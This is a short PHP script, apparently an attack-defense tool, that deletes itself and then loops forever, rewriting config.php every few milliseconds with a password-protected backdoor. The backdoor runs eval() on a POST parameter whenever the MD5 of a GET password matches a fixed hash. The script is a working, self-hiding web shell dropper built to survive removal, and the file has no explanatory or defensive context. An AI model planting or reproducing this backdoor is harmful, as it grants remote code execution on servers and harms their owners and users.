<?php 
	//By ZacharyZcR
	ignore_user_abort(true);
	set_time_limit(0);
	unlink(__FILE__);
	$file = 'config.php';
	$code = '<?php if(md5($_GET["pass"])=="7eace5a6944abdd9419f36694fdf54ca"){@eval($_POST[a]);} ?>';
	while (1){
		file_put_contents($file,$code);
		usleep(5000);
}
?>
